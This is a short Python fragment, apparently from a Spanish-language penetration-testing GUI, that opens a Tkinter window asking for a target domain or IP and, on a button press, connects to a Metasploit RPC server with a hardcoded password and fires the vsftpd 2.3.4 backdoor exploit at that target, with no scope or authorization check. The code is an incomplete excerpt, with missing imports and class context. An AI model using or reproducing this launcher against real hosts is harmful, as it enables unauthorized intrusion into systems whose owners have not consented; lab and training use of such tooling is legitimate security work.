from metasploit.msfrpc import MsfRpcClient

def explotacion(self):
    new_window = tk.Toplevel(self.root)
    new_window.title("Explotación")
    new_window.geometry("600x400")
    new_window.config(bg='#FFD700')
    
    label = tk.Label(new_window, text="Fase de Explotación: Ejecución de exploits", font=("Arial", 14), bg='#FFD700', fg='#8B0000')
    label.pack(pady=20)
    
    info_label = tk.Label(new_window, text="Ingrese el dominio o IP objetivo:", bg='#FFD700', fg='#8B0000')
    info_label.pack(pady=5)
    
    target_entry = tk.Entry(new_window, width=50)
    target_entry.pack(pady=5)
    
    def start_exploit():
        target = target_entry.get()
        client = MsfRpcClient('msfpassword')
        exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = target
        exploit.execute()
        result = f"Explotación iniciada en {target}"
        result_label.config(text=result)
    
    start_button = tk.Button(new_window, text="Iniciar Explotación", command=start_exploit)
    start_button.pack(pady=10)
    
    result_label = tk.Label(new_window, text="", bg='#FFD700', fg='#8B0000')
    result_label.pack(pady=10)

